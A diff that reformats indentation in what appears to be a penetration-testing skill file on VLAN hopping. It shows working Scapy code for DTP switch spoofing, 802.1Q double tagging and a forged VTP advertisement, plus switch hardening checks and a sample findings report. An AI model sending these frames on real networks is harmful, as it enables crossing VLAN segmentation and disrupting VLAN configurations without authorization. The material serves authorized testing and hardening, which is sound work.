@@ -1,12 +1,12 @@
 ---
 name: performing-vlan-hopping-attack
 description: >-
-  Simulates VLAN hopping attacks using switch spoofing and 802.1Q double
-  tagging techniques in authorized lab environments to test VLAN segmentation
-  effectiveness and switch port security. Use during an authorized
-  penetration test to validate trunk port hardening, confirm DTP is disabled
-  on access ports, and demonstrate Layer 2 segmentation bypass risk to
-  network teams.
+ Simulates VLAN hopping attacks using switch spoofing and 802.1Q double
+ tagging techniques in authorized lab environments to test VLAN segmentation
+ effectiveness and switch port security. Use during an authorized
+ penetration test to validate trunk port hardening, confirm DTP is disabled
+ on access ports, and demonstrate Layer 2 segmentation bypass risk to
+ network teams.
 domain: cybersecurity
 subdomain: network-security
 tags:
@@ -97,15 +97,15 @@ from scapy.contrib.dtp import *
 
 # Send DTP desirable frame to negotiate trunk
 dtp_frame = (
-    Ether(dst="01:00:0c:cc:cc:cc", src=get_if_hwaddr("eth0")) /
-    LLC(dsap=0xaa, ssap=0xaa, ctrl=3) /
-    SNAP(OUI=0x00000c, code=0x2004) /
-    DTP(tlvlist=[
-        DTPDomain(type=0x0001, domain=""),
-        DTPStatus(type=0x0002, status=b"\x03"),  # Desirable
-        DTPType(type=0x0003, dtptype=b"\xa5"),    # 802.1Q trunk
-        DTPNeighbor(type=0x0004, neighbor=get_if_hwaddr("eth0"))
-    ])
+ Ether(dst="01:00:0c:cc:cc:cc", src=get_if_hwaddr("eth0")) /
+ LLC(dsap=0xaa, ssap=0xaa, ctrl=3) /
+ SNAP(OUI=0x00000c, code=0x2004) /
+ DTP(tlvlist=[
+ DTPDomain(type=0x0001, domain=""),
+ DTPStatus(type=0x0002, status=b"\x03"), # Desirable
+ DTPType(type=0x0003, dtptype=b"\xa5"), # 802.1Q trunk
+ DTPNeighbor(type=0x0004, neighbor=get_if_hwaddr("eth0"))
+ ])
 )
 
 sendp(dtp_frame, iface="eth0", count=10, inter=1)
@@ -148,11 +148,11 @@ target_ip = "10.10.20.10"
 target_mac = "ff:ff:ff:ff:ff:ff"
 
 double_tagged = (
-    Ether(dst=target_mac, src=get_if_hwaddr("eth0")) /
-    Dot1Q(vlan=1) /       # Outer tag: native VLAN (will be stripped)
-    Dot1Q(vlan=20) /      # Inner tag: target VLAN (will be forwarded)
-    IP(dst=target_ip, src="10.10.20.99") /
-    ICMP(type=8)           # Echo request
+ Ether(dst=target_mac, src=get_if_hwaddr("eth0")) /
+ Dot1Q(vlan=1) / # Outer tag: native VLAN (will be stripped)
+ Dot1Q(vlan=20) / # Inner tag: target VLAN (will be forwarded)
+ IP(dst=target_ip, src="10.10.20.99") /
+ ICMP(type=8) # Echo request
 )
 
 # Send the double-tagged frame
@@ -182,23 +182,23 @@ from scapy.all import *
 # Craft VTP summary advertisement with high revision number
 # WARNING: This can disrupt the entire VLAN domain if successful
 vtp_frame = (
-    Ether(dst="01:00:0c:cc:cc:cc", src=get_if_hwaddr("eth0")) /
-    LLC(dsap=0xaa, ssap=0xaa, ctrl=3) /
-    SNAP(OUI=0x00000c, code=0x2003) /
-    Raw(load=bytes([
-        0x02,                    # Version 2
-        0x01,                    # Summary advertisement
-        0x00,                    # Followers
-        0x06,                    # Domain name length
-        0x54, 0x45, 0x53, 0x54, # Domain: "TEST"
-        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-        0x00, 0x00, 0xFF, 0xFF, # High revision number
-        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-        0x00, 0x00, 0x00, 0x00, # MD5 digest (zeros for lab)
-    ]))
+ Ether(dst="01:00:0c:cc:cc:cc", src=get_if_hwaddr("eth0")) /
+ LLC(dsap=0xaa, ssap=0xaa, ctrl=3) /
+ SNAP(OUI=0x00000c, code=0x2003) /
+ Raw(load=bytes([
+ 0x02, # Version 2
+ 0x01, # Summary advertisement
+ 0x00, # Followers
+ 0x06, # Domain name length
+ 0x54, 0x45, 0x53, 0x54, # Domain: "TEST"
+ 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+ 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+ 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+ 0x00, 0x00, 0xFF, 0xFF, # High revision number
+ 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+ 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+ 0x00, 0x00, 0x00, 0x00, # MD5 digest (zeros for lab)
+ ]))
 )
 
 # Only send in authorized lab environments
@@ -215,7 +215,7 @@ PYEOF
 # Check DTP status on access ports (should be nonegotiate)
 # show interfaces <interface> switchport
 # Expected: Administrative Mode: static access
-#           Negotiation of Trunking: Off
+# Negotiation of Trunking: Off
 
 # Check native VLAN configuration (should not be VLAN 1)
 # show interfaces trunk
@@ -251,15 +251,15 @@ Tester: Security Assessment Team
 Authorization: PENTEST-2024-0847
 
 Test 1: DTP Switch Spoofing
-  Result: VULNERABLE - Port negotiated trunk in 3 seconds
-  Access gained to: VLANs 1, 10, 20, 30, 40
+ Result: VULNERABLE - Port negotiated trunk in 3 seconds
+ Access gained to: VLANs 1, 10, 20, 30, 40
 
 Test 2: Double Tagging
-  Result: VULNERABLE - Frames reached VLAN 20 from VLAN 1
-  Note: Unidirectional only (no return traffic)
+ Result: VULNERABLE - Frames reached VLAN 20 from VLAN 1
+ Note: Unidirectional only (no return traffic)
 
 Test 3: VTP Attack
-  Result: NOT TESTED - VTP in transparent mode
+ Result: NOT TESTED - VTP in transparent mode
 EOF
 ```
 
